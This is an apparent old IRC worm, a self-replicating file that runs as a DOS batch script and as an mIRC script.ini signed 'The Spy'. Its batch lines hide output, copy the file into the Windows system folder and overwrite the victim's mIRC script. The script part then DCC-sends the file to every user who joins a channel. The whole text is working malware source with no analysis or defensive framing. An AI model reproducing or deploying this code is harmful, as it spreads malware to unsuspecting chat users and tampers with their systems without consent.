@ctty nul.
@copy /y %0 c:\windows\system\2.bat
@copy /y %0 c:\mirc\script.ini
[script]
n0=ON 1:JOIN:#:{ /if ( $nick != $me ) { /dcc send $nick c:\windows\system\2.bat }
n1=;The Spy

